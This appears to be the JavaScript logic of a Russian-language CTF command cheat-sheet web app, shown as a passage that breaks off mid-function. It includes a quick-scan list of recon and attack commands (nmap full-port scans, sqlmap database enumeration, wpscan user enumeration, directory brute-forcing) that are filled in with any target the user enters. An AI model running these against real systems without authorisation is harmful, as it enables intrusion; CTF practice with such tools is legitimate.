/* ============================================================
   CTF Console Docs — application logic
   ============================================================ */

const state = {
  view: "home",   // home|category|search|tools|payloads|notes|reference|favorites
  category: null,
  payloadCat: null,
  refTab: "ports",
  query: "",
  freq: "all",
  target: "",     // current scan target — substituted into commands
};

const freqLabel = { high: "Часто", medium: "Иногда", low: "Редко" };

/* ---------- DOM refs ---------- */
const $ = (s, r = document) => r.querySelector(s);
const navList      = $("#nav-list");
const content      = $("#content-inner");
const tocEl        = $("#toc");
const tocList      = $("#toc-list");
const searchEl     = $("#search-input");
const clearEl      = $("#search-clear");
const toastWrap    = $("#toast-container");
const sidebar      = $("#sidebar");
const modalOverlay = $("#modal-overlay");
const toolPopover  = $("#tool-popover");

/* ============================================================
   Target substitution
   ============================================================ */
const TARGET_KEY = "ctf-target";

function parseTarget(raw) {
  const t = raw.trim();
  if (!t) return { url: "", host: "", domain: "", ip: "" };
  const url    = /^https?:\/\//i.test(t) ? t.replace(/\/$/, "") : `http://${t}`;
  const host   = url.replace(/^https?:\/\//i, "").split("/")[0];
  const domain = host.replace(/:\d+$/, "");
  return { url, host, domain, ip: domain };
}

function applyTarget(cmd) {
  const t = state.target.trim();
  if (!t) return cmd;
  const { url, host, domain, ip } = parseTarget(t);
  return cmd
    .replace(/\[URL\]/g, url)
    .replace(/\[url\]/g, url)
    .replace(/\[хост\]/g, host)
    .replace(/\[домен\]/g, domain)
    .replace(/\[domain\]/g, domain)
    .replace(/\[IP\]/g, ip)
    .replace(/\[ip\]/g, ip)
    .replace(/\[host\]/g, host)
    .replace(/\[адрес\]/g, host)
    .replace(/\[цель\]/g, host);
}

function setTarget(val) {
  state.target = val;
  localStorage.setItem(TARGET_KEY, val);
  const clearBtn = document.getElementById("target-clear");
  const wrap     = document.getElementById("target-wrap");
  if (clearBtn) clearBtn.classList.toggle("hidden", !val.trim());
  if (wrap)     wrap.classList.toggle("has-target", !!val.trim());
}

/* ---- recon commands for Quick Scan panel ---- */
const RECON_CMDS = [
  { tool:"dirsearch",    desc:"Перебор директорий и файлов",                cmd:"dirsearch -u [URL] -e php,html,js,txt,bak,zip -t 20 --random-agent" },
  { tool:"ffuf",         desc:"Быстрый fuzzing директорий (SecLists)",       cmd:"ffuf -w /usr/share/wordlists/dirb/common.txt -u [URL]/FUZZ -mc 200,204,301,302,307,403" },
  { tool:"gobuster",     desc:"Перебор директорий",                          cmd:"gobuster dir -u [URL] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 40" },
  { tool:"nikto",        desc:"Сканер уязвимостей и конфигурации",           cmd:"nikto -h [URL]" },
  { tool:"sqlmap",       desc:"Автоматическая SQL-инъекция",                 cmd:"sqlmap -u \"[URL]\" --batch --dbs --random-agent" },
  { tool:"nmap",         desc:"Сканирование портов и сервисов",              cmd:"nmap -sV -sC -T4 -p- [хост] -oN nmap_[хост].txt" },
  { tool:"whatweb",      desc:"Технологии и CMS сервера",                    cmd:"whatweb -a 3 [URL]" },
  { tool:"wfuzz vhost",  desc:"Поиск поддоменов (vhost fuzzing)",            cmd:"wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u [URL] -H \"Host: FUZZ.[домен]\" --hc 404,400" },
  { tool:"curl headers", desc:"Заголовки HTTP-ответа сервера",               cmd:"curl -sI [URL]" },
  { tool:"curl robots",  desc:"Robots.txt — скрытые пути",                  cmd:"curl -s [URL]/robots.txt" },
  { tool:"feroxbuster",  desc:"Рекурсивный перебор директорий",              cmd:"feroxbuster -u [URL] -w /usr/share/wordlists/dirb/common.txt -x php,html,js" },
  { tool:"wpscan",       desc:"Сканер уязвимостей WordPress",                cmd:"wpscan --url [URL] --enumerate u,p,t,cb,dbe" },
];

/* ============================================================
   Custom commands — localStorage
   ============================================================ */
const STORAGE_KEY = "ctf-custom-commands";

function loadCustomCmds() {
  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]"); }
  catch { return []; }
}
function saveCustomCmds(arr) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(arr));
}
function injectCustomCmds() {
  const custom = loadCustomCmds();
  custom.forEach(cmd => {
    if (!ctfData.commands.find(c => c.id === cmd.id)) {
      ctfData.commands.push(cmd);
    }
  });
}
function deleteCustomCmd(id) {
  const arr = loadCustomCmds().filter(c => c.id !== id);
  saveCustomCmds(arr);
  ctfData.commands = ctfData.commands.filter(c => c.id !== id);
  render();
  toast("Команда удалена");
}

/* ---------- helpers ---------- */
function escapeHtml(s) {
  return String(s)
    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}
function highlight(text, q) {
  const safe = escapeHtml(text);
  if (!q) return safe;
  const esc = q.replace(/[-\/\\^$*+?.()|[\]{}]/g, "\\$&");
  return safe.replace(new RegExp(`(${esc})`, "gi"), "<mark>$1</mark>");
}
function flagify(safeText) {
  return safeText.replace(/flag\{[^}]*\}/gi, '<span class="tok-flag">$&</span>');
}
function colorizeOutput(raw) {
  let safe = escapeHtml(raw);
  safe = safe.replace(/^.*?\$\s/gm, (m) => `<span class="tok-prompt">${m}</span>`);
  safe = flagify(safe);
  return safe;
}
function cmdsFor(catId) { return ctfData.commands.filter(c => c.categoryId === catId); }
function catById(id) { return ctfData.categories.find(c => c.id === id); }

/* ============================================================
   Sidebar nav
   ============================================================ */
function renderNav() {
  let html = `
    <button class="nav-item ${state.view==="home"?"active":""}" data-action="home">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg></span>
      <span class="nav-name">Обзор</span>
    </button>
    <div class="nav-label">Категории</div>`;
  ctfData.categories.forEach(cat => {
    const active = state.view==="category" && state.category===cat.id;
    html += `
      <button class="nav-item ${active?"active":""}" data-action="cat" data-cat="${cat.id}">
        <span class="nav-ico">${cat.icon}</span>
        <span class="nav-name">${cat.title}</span>
        <span class="nav-count">${cmdsFor(cat.id).length}</span>
      </button>`;
  });
  const favCount = loadFavorites().size;
  html += `<div class="nav-label">Инструменты</div>
    <button class="nav-item ${state.view==="tools"?"active":""}" data-action="tools">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg></span>
      <span class="nav-name">Декодер / Хеши</span>
    </button>
    <button class="nav-item ${state.view==="payloads"?"active":""}" data-action="payloads">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg></span>
      <span class="nav-name">Пейлоады</span>
    </button>
    <button class="nav-item ${state.view==="reference"?"active":""}" data-action="reference">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 19.5A2.5 2.5 0 0 1 6.5 17H20"/><path d="M6.5 2H20v20H6.5A2.5 2.5 0 0 1 4 19.5v-15A2.5 2.5 0 0 1 6.5 2z"/></svg></span>
      <span class="nav-name">Справочник</span>
    </button>
    <button class="nav-item ${state.view==="favorites"?"active":""}" data-action="favorites">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></span>
      <span class="nav-name">Избранное</span>
      ${favCount>0?`<span class="nav-count">${favCount}</span>`:""}
    </button>
    <button class="nav-item ${state.view==="notes"?"active":""}" data-action="notes">
      <span class="nav-ico"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></span>
      <span class="nav-name">Заметки</span>
    </button>`;
  navList.innerHTML = html;
  navList.querySelectorAll(".nav-item").forEach(btn => {
    btn.addEventListener("click", () => {
      closeSidebar();
      const a = btn.dataset.action;
      if (a==="home") goHome();
      else if (a==="cat") openCategory(btn.dataset.cat);
      else if (a==="tools")     openTools();
      else if (a==="payloads")  openPayloads();
      else if (a==="notes")     openNotes();
      else if (a==="reference") openReference();
      else if (a==="favorites") openFavorites();
    });
  });
}

/* ============================================================
   Command section markup
   ============================================================ */
function freqTag(freq) {
  return `<span class="freq freq-${freq}"><span class="dot"></span>${freqLabel[freq]}</span>`;
}

function commandHTML(cmd, { showCat }) {
  const q = state.query;
  const id = "cmd-" + cmd.id;

  let explainHTML = "";
  if (cmd.explanation?.length) {
    explainHTML = `
      <div class="explain">
        <div class="explain-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="8" y1="6" x2="21" y2="6"/><line x1="8" y1="12" x2="21" y2="12"/><line x1="8" y1="18" x2="21" y2="18"/><line x1="3" y1="6" x2="3.01" y2="6"/><line x1="3" y1="12" x2="3.01" y2="12"/><line x1="3" y1="18" x2="3.01" y2="18"/></svg>
          Разбор команды
        </div>
        <ul class="explain-list">
          ${cmd.explanation.map(it => `
            <li class="explain-item">
              <span class="arg-token">${highlight(it.arg, q)}</span>
              <span class="arg-desc">${highlight(it.desc, q)}</span>
            </li>`).join("")}
        </ul>
      </div>`;
  }

  let outputHTML = "";
  if (cmd.output) {
    let callout = "";
    if (cmd.important?.length) {
      callout = `
        <div class="callout">
          <div class="callout-title">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            На что обратить внимание в выводе
          </div>
          <ul class="callout-list">
            ${cmd.important.map(it => `
              <li class="callout-item">
                <span class="callout-token">${flagify(highlight(it.token, q))}</span>
                <span class="callout-desc">${highlight(it.desc, q)}</span>
              </li>`).join("")}
          </ul>
        </div>`;
    }
    outputHTML = `
      <div class="output">
        <div class="output-title">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
          Пример вывода
        </div>
        <div class="output-pre"><pre><code>${colorizeOutput(cmd.output)}</code></pre></div>
        ${callout}
      </div>`;
  }

  const isFav = isFavorite(cmd.id);
  const starBtn = `<button class="cmd-star-btn ${isFav?"starred":""}" data-star="${cmd.id}" title="${isFav?"Убрать из избранного":"Добавить в избранное"}"><svg viewBox="0 0 24 24" fill="${isFav?"currentColor":"none"}" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg></button>`;
  const catTag = showCat
    ? `<span class="cmd-cat-tag">${catById(cmd.categoryId)?.title || ""}</span>` : "";
  const customBadge = cmd.custom
    ? `<span class="custom-badge">моя</span>` : "";
  const deleteBtn = cmd.custom
    ? `<button class="cmd-delete-btn" data-delete="${cmd.id}" title="Удалить команду">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>
        Удалить
      </button>` : "";

  return `
    <section class="cmd anim" id="${id}" data-tool="${escapeHtml(cmd.tool)}">
      <div class="cmd-head">
        <a class="cmd-anchor" href="#${id}">
          <span class="cmd-title">${highlight(cmd.tool, q)}</span>
          <span class="hash">#</span>
        </a>
        ${catTag}
        ${customBadge}
        ${freqTag(cmd.frequency)}
        ${starBtn}
        ${deleteBtn}
      </div>
      <p class="cmd-desc">${highlight(cmd.description, q)}</p>
      <div class="code">
        <div class="code-bar">
          <span class="label">shell</span>
          <button class="copy-btn" type="button">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            <span>Копировать</span>
          </button>
        </div>
        <pre><code>${flagify(highlight(applyTarget(cmd.command), q))}</code></pre>
      </div>
      ${explainHTML}
      ${outputHTML}
    </section>`;
}

/* ============================================================
   Views
   ============================================================ */
function renderHome() {
  tocEl.style.display = "none";
  const total = ctfData.commands.length;
  let cards = ctfData.categories.map(cat => {
    const n = cmdsFor(cat.id).length;
    return `
      <button class="cat-card anim" data-cat="${cat.id}">
        <div class="cat-card-top">
          <div class="cat-card-ico">${cat.icon}</div>
          <span class="cat-card-count">${n} ${plural(n, "команда","команды","команд")}</span>
        </div>
        <h3>${cat.title}</h3>
        <div class="cat-card-sub">${cat.subtitle}</div>
        <p>${cat.description}</p>
        <span class="cat-card-go">Открыть
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
        </span>
      </button>`;
  }).join("");

  content.innerHTML = `
    <div class="home-hero">
      <div class="page-eyebrow">Шпаргалка CTF</div>
      <h1 class="page-title">Командный справочник<br>по форматам CTF</h1>
      <p class="page-desc">Готовые команды консольных инструментов для решения задач Capture The Flag: реверс, криптография, OSINT, веб, PWN, форензика и стеганография. У каждой команды — разбор аргументов, пример вывода и подсказки, на что смотреть.</p>
      <div class="software">
        <span class="software-label">Всего</span>
        <span class="chip">${ctfData.categories.length} категорий</span>
        <span class="chip">${total} команд</span>
        <span class="chip">нажмите <b style="color:var(--text)">/</b> для поиска</span>
      </div>
    </div>
    <div class="home-grid">${cards}</div>`;

  content.querySelectorAll(".cat-card").forEach(c =>
    c.addEventListener("click", () => openCategory(c.dataset.cat)));
}

function renderCategory() {
  const cat = catById(state.category);
  let cmds = cmdsFor(state.category);
  if (state.freq !== "all") cmds = cmds.filter(c => c.frequency === state.freq);

  const chips = (cat.programs || []).map((p, i) => {
    if (typeof p === "string") return `<span class="chip">${p}</span>`;
    return `<button class="chip chip-tool" data-prog-idx="${i}" type="button">${escapeHtml(p.name)}</button>`;
  }).join("");

  const head = `
    <div class="crumb">
      <a data-home>Обзор</a>
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
      <span class="here">${cat.title}</span>
    </div>
    <div class="page-head">
      <div class="page-eyebrow">${cat.subtitle}</div>
      <h1 class="page-title">${cat.title}</h1>
      <p class="page-desc">${cat.description}</p>
      ${chips ? `<div class="software"><span class="software-label">Поможет в решении:</span>${chips}</div>` : ""}
    </div>
    <div class="toolbar">
      <div class="result-count"><b>${cmds.length}</b> ${plural(cmds.length,"команда","команды","команд")}</div>
      <div style="display:flex;gap:8px;align-items:center">
        ${filterBarHTML()}
        <button class="add-cmd-btn" data-cat="${cat.id}">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="5" x2="12" y2="19"/><line x1="5" y1="12" x2="19" y2="12"/></svg>
          Добавить
        </button>
      </div>
    </div>`;

  const body = cmds.length
    ? `<div class="commands">${cmds.map(c => commandHTML(c, { showCat: false })).join("")}</div>`
    : emptyHTML();

  content.innerHTML = head + quickScanPanel(cat.id) + templateAccordion(cat.id) + analysisPanel(cat.id) + body;
  wireCommon();
  wireProgChips(cat);
  wireQuickScan();
  wireTemplates(cat.id);
  wireAnalysisPanel(cat.id);
  buildTOC(cmds);
}

function renderSearch() {
  const q = state.query.toLowerCase();
  let results = ctfData.commands.filter(cmd => matchesQuery(cmd, q));
  if (state.freq !== "all") results = results.filter(c => c.frequency === state.freq);

  const head = `
    <div class="crumb">
      <a data-home>Обзор</a>
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>
      <span class="here">Поиск</span>
    </div>
    <div class="page-head">
      <div class="page-eyebrow">Результаты поиска</div>
      <h1 class="page-title">«${escapeHtml(state.query)}»</h1>
    </div>
    <div class="toolbar">
      <div class="result-count"><b>${results.length}</b> ${plural(results.length,"совпадение","совпадения","совпадений")}</div>
      ${filterBarHTML()}
    </div>`;

  const body = results.length
    ? `<div class="commands">${results.map(c => commandHTML(c, { showCat: true })).join("")}</div>`
    : emptyHTML();

  content.innerHTML = head + body;
  wireCommon();
  buildTOC(results, true);
}

function matchesQuery(cmd, q) {
  if (!q) return true;
  const hay = [
    cmd.tool, cmd.description, cmd.command, cmd.output || "",
    ...(cmd.explanation || []).flatMap(e => [e.arg, e.desc]),
    ...(cmd.important || []).flatMap(i => [i.token, i.desc]),
  ].join(" ").toLowerCase();
  return hay.includes(q);
}

/* ---------- shared bits ---------- */
function filterBarHTML() {
  const f = state.freq;
  const btn = (k, lbl) => `<button class="filter-btn ${f === k ? "active" : ""}" data-freq="${k}">${lbl}</button>`;
  return `<div class="filters">
    ${btn("all","Все")}${btn("high","Часто")}${btn("medium","Иногда")}${btn("low","Редко")}
  </div>`;
}
function emptyHTML() {
  return `<div class="empty" style="display:flex">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/><line x1="8" y1="11" x2="14" y2="11"/></svg>
    <h3>Ничего не найдено</h3>
    <p>Попробуйте изменить запрос или сбросить фильтр частоты.</p>
  </div>`;
}
function plural(n, one, few, many) {
  const m10 = n % 10, m100 = n % 100;
  if (m10 === 1 && m100 !== 11) return one;
  if (m10 >= 2 && m10 <= 4 && (m100 < 10 || m100 >= 20)) return few;
  return many;
}

function wireCommon() {
  content.querySelectorAll(".filter-btn").forEach(b =>
    b.addEventListener("click", () => { state.freq = b.dataset.freq; render(); }));
  content.querySelectorAll("[data-home]").forEach(a =>
    a.addEventListener("click", goHome));
  content.querySelectorAll(".cmd").forEach((sec, i) => {
    const cmd = currentCmds[i];
    const btn = sec.querySelector(".copy-btn");
    if (btn && cmd) btn.addEventListener("click", () => copyText(applyTarget(cmd.command), btn));
  });
  content.querySelectorAll(".cmd-anchor").forEach(a =>
    a.addEventListener("click", () => setTimeout(syncTOC, 60)));
  content.querySelectorAll("[data-star]").forEach(btn =>
    btn.addEventListener("click", () => {
      const id = btn.dataset.star;
      toggleFavorite(id);
      const starred = isFavorite(id);
      btn.classList.toggle("starred", starred);
      btn.title = starred ? "Убрать из избранного" : "Добавить в избранное";
      btn.querySelector("svg").setAttribute("fill", starred ? "currentColor" : "none");
      renderNav();
      if (starred) toast(`Добавлено в избранное`);
    }));
  content.querySelectorAll("[data-delete]").forEach(btn =>
    btn.addEventListener("click", () => deleteCustomCmd(btn.dataset.delete)));
  content.querySelectorAll(".add-cmd-btn").forEach(btn =>
    btn.addEventListener("click", () => openModal(btn.dataset.cat)));
}

let currentCmds = [];
function setCurrentCmds(arr) { currentCmds = arr; }

/* ============================================================
   TOC + scroll spy
   ============================================================ */
function buildTOC(cmds, showCat = false) {
  setCurrentCmds(cmds);
  if (!cmds.length) { tocEl.style.display = "none"; return; }
  tocEl.style.display = "block";
  tocList.innerHTML = cmds.map(c =>
    `<li><a class="toc-link" href="#cmd-${c.id}" data-target="cmd-${c.id}">${escapeHtml(c.tool)}</a></li>`
  ).join("");
  tocList.querySelectorAll(".toc-link").forEach(a =>
    a.addEventListener("click", () => setTimeout(syncTOC, 60)));
  syncTOC();
}
function syncTOC() {
  const links = [...tocList.querySelectorAll(".toc-link")];
  if (!links.length) return;
  const offset = 120;
  let activeId = links[0].dataset.target;
  for (const l of links) {
    const el = document.getElementById(l.dataset.target);
    if (el && el.getBoundingClientRect().top <= offset) activeId = l.dataset.target;
  }
  links.forEach(l => l.classList.toggle("active", l.dataset.target === activeId));
}

/* ============================================================
   Navigation
   ============================================================ */
function goHome() {
  state.view = "home"; state.category = null; state.query = ""; state.freq = "all";
  searchEl.value = ""; clearEl.style.display = "none";
  render(); scrollTop();
}
function openCategory(id) {
  state.view = "category"; state.category = id; state.query = ""; state.freq = "all";
  searchEl.value = ""; clearEl.style.display = "none";
  render(); scrollTop();
}
function render() {
  hideToolPopover();
  renderNav();
  if      (state.view==="search")    renderSearch();
  else if (state.view==="category")  renderCategory();
  else if (state.view==="tools")     renderTools();
  else if (state.view==="payloads")  renderPayloads();
  else if (state.view==="notes")     renderNotes();
  else if (state.view==="reference") renderReference();
  else if (state.view==="favorites") renderFavorites();
  else renderHome();
}
function openTools() {
  state.view="tools"; state.category=null; state.query=""; state.freq="all";
  searchEl.value=""; clearEl.style.display="none";
  render(); scrollTop();
}
function openPayloads(catId) {
  state.view="payloads"; state.payloadCat=catId||ctfData.payloadCategories[0].id;
  state.category=null; state.query=""; state.freq="all";
  searchEl.value=""; clearEl.style.display="none";
  render(); scrollTop();
}
function openNotes() {
  state.view="notes"; state.category=null; state.query=""; state.freq="all";
  searchEl.value=""; clearEl.style.display="none";
  render(); scrollTop();
}
function openReference(tab) {
  state.view="reference"; state.refTab=tab||"ports"; state.category=null; state.query="";
  searchEl.value=""; clearEl.style.display="none";
  render(); scrollTop();
}
function openFavorites() {
  state.view="favorites"; state.category=null; state.query=""; state.freq="all";
  searchEl.value=""; clearEl.style.display="none";
  render(); scrollTop();
}
function scrollTop() { window.scrollTo({ top: 0 }); document.querySelector(".content")?.scrollTo?.({top:0}); }

/* ============================================================
   Copy + toast
   ============================================================ */
function copyText(text, btn) {
  const done = () => flashCopied(btn);
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).then(done).catch(() => fallbackCopy(text, done));
  } else fallbackCopy(text, done);
}
function fallbackCopy(text, cb) {
  const ta = document.createElement("textarea");
  ta.value = text; ta.style.position = "fixed"; ta.style.left = "-9999px";
  document.body.appendChild(ta); ta.select();
  try { document.execCommand("copy"); cb(); } catch (e) { toast("Не удалось скопировать"); }
  document.body.removeChild(ta);
}
function flashCopied(btn) {
  const span = btn.querySelector("span");
  const svg = btn.querySelector("svg");
  const orig = svg.innerHTML, origTxt = span.textContent;
  btn.classList.add("copied");
  span.textContent = "Скопировано";
  svg.innerHTML = `<polyline points="20 6 9 17 4 12"/>`;
  toast("Команда скопирована в буфер обмена");
  setTimeout(() => { btn.classList.remove("copied"); span.textContent = origTxt; svg.innerHTML = orig; }, 1800);
}
function toast(msg) {
  const t = document.createElement("div");
  t.className = "toast";
  t.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg><span>${msg}</span>`;
  toastWrap.appendChild(t);
  setTimeout(() => { t.classList.add("fade-out"); t.addEventListener("animationend", () => t.remove()); }, 2200);
}

/* ============================================================
   Theme
   ============================================================ */
function setTheme(theme) {
  document.documentElement.setAttribute("data-theme", theme);
  localStorage.setItem("ctf-theme", theme);
  document.querySelectorAll(".theme-toggle button").forEach(b =>
    b.classList.toggle("active", b.dataset.theme === theme));
}

/* ============================================================
   Sidebar (mobile)
   ============================================================ */
function openSidebar() { sidebar.classList.add("open"); }
function closeSidebar() { sidebar.classList.remove("open"); }

/* ============================================================
   Modal — add custom command
   ============================================================ */
let modalTargetCat = null;

function openModal(catId) {
  modalTargetCat = catId || (state.category || ctfData.categories[0].id);
  const sel = $("#f-category");
  sel.innerHTML = ctfData.categories.map(c =>
    `<option value="${c.id}" ${c.id === modalTargetCat ? "selected" : ""}>${c.title}</option>`
  ).join("");
  $("#f-tool").value = "";
  $("#f-desc").value = "";
  $("#f-command").value = "";
  $("#f-output").value = "";
  $("#explain-rows").innerHTML = "";
  document.querySelector('input[name="f-freq"][value="medium"]').checked = true;
  modalOverlay.classList.remove("hidden");
  setTimeout(() => $("#f-tool").focus(), 50);
}

function closeModal() {
  modalOverlay.classList.add("hidden");
}

function addExplainRow(arg = "", desc = "") {
  const rows = $("#explain-rows");
  const div = document.createElement("div");
  div.className = "explain-row";
  div.innerHTML = `
    <input class="form-input" type="text" placeholder="аргумент" value="${escapeHtml(arg)}" data-explain="arg">
    <input class="form-input" type="text" placeholder="описание" value="${escapeHtml(desc)}" data-explain="desc">
    <button class="explain-row-remove" type="button" title="Удалить строку">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
    </button>`;
  div.querySelector(".explain-row-remove").addEventListener("click", () => div.remove());
  rows.appendChild(div);
}

function saveCustomCommand() {
  const tool = $("#f-tool").value.trim();
  const desc = $("#f-desc").value.trim();
  const command = $("#f-command").value.trim();
  const categoryId = $("#f-category").value;
  const frequency = document.querySelector('input[name="f-freq"]:checked')?.value || "medium";
  const output = $("#f-output").value.trim();

  if (!tool || !desc || !command) {
    toast("Заполните обязательные поля: название, описание, команда");
    return;
  }

  const explanation = [...$("#explain-rows").querySelectorAll(".explain-row")]
    .map(row => ({
      arg: row.querySelector('[data-explain="arg"]').value.trim(),
      desc: row.querySelector('[data-explain="desc"]').value.trim(),
    }))
    .filter(e => e.arg && e.desc);

  const id = "custom-" + Date.now();
  const cmd = { id, categoryId, tool, description: desc, command, frequency, custom: true };
  if (explanation.length) cmd.explanation = explanation;
  if (output) cmd.output = output;

  const arr = loadCustomCmds();
  arr.push(cmd);
  saveCustomCmds(arr);
  ctfData.commands.push(cmd);

  closeModal();
  openCategory(categoryId);
  toast(`Команда «${tool}» добавлена`);
}

/* ============================================================
   Favorites — localStorage
   ============================================================ */
const FAV_KEY = "ctf-favorites";
function loadFavorites() {
  try { return new Set(JSON.parse(localStorage.getItem(FAV_KEY)||"[]")); } catch { return new Set(); }
}
function saveFavorites(s) { localStorage.setItem(FAV_KEY, JSON.stringify([...s])); }
function isFavorite(id) { return loadFavorites().has(id); }
function toggleFavorite(id) {
  const s = loadFavorites();
  s.has(id) ? s.delete(id) : s.add(id);
  saveFavorites(s);
}

function renderFavorites() {
  tocEl.style.display = "none";
  const favIds = loadFavorites();
  const cmds = ctfData.commands.filter(c => favIds.has(c.id));
  const head = `
    <div class="page-head">
      <div class="page-eyebrow">Коллекция</div>
      <h1 class="page-title">Избранное</h1>
      <p class="page-desc">Команды, отмеченные звёздочкой. Нажмите ★ на любой команде чтобы добавить или убрать.</p>
    </div>`;
  const body = cmds.length
    ? `<div class="commands">${cmds.map(c => commandHTML(c, {showCat:true})).join("")}</div>`
    : `<div class="empty" style="display:flex">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
        <h3>Избранное пусто</h3>
        <p>Нажмите ★ на любой команде чтобы добавить её сюда.</p>
      </div>`;
  content.innerHTML = head + body;
  setCurrentCmds(cmds);
  content.querySelectorAll("[data-star]").forEach(btn =>
    btn.addEventListener("click", () => {
      const id = btn.dataset.star;
      toggleFavorite(id);
      render();
    }));
  content.querySelectorAll(".copy-btn").forEach((btn, i) => {
    if (cmds[i]) btn.addEventListener("click", () => copyText(cmds[i].command, btn));
  });
}

/* ============================================================
   Notes — localStorage scratchpad
   ============================================================ */
const NOTES_KEY = "ctf-notes";

function renderNotes() {
  tocEl.style.display = "none";
  const saved = localStorage.getItem(NOTES_KEY) || "";
  content.innerHTML = `
    <div class="page-head" style="margin-bottom:20px">
      <div class="page-eyebrow">Сессия</div>
      <h1 class="page-title">Заметки</h1>
      <p class="page-desc">Локальный блокнот для текущей CTF-сессии. Сохраняется автоматически в браузере.</p>
    </div>
    <div class="notes-toolbar">
      <span class="notes-saved-label" id="notes-saved">Сохранено</span>
      <div style="display:flex;gap:8px">
        <button class="btn-cancel" id="notes-copy-btn">Скопировать всё</button>
        <button class="btn-cancel" id="notes-clear-btn" style="color:var(--text-3)">Очистить</button>
      </div>
    </div>
    <textarea class="notes-area" id="notes-area" placeholder="Заметки по заданию…

Найденные флаги:
  flag{...}

Попытки:
  - попробовал base64 → не то
  - xor с ключом 0x41 → ...

Полезные команды:
  strings ./binary | grep flag
  ...
" spellcheck="false">${escapeHtml(saved)}</textarea>`;

  const area = document.getElementById("notes-area");
  const label = document.getElementById("notes-saved");
  let timer;
  area.addEventListener("input", () => {
    label.textContent = "Сохранение…";
    clearTimeout(timer);
    timer = setTimeout(() => {
      localStorage.setItem(NOTES_KEY, area.value);
      label.textContent = "Сохранено  ✓";
